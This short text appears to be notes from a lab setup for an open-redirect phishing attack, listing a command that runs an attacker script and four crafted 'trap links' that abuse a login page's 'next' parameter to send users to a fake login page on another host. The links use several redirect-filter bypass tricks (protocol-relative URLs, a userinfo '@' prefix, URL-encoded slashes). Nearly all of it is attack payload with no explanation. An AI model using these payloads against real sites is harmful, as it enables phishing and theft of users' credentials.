Attacker commands:
./run_attacker.sh

Trap links:
http://172.20.0.10/login?next=http://192.168.10.50/fake-login.html
http://172.20.0.10/login?next=//192.168.10.50/fake-login.html
http://172.20.0.10/login?next=http://172.20.0.10@192.168.10.50/fake-login.html
http://172.20.0.10/login?next=%2F%2F192.168.10.50%2Ffake-login.html
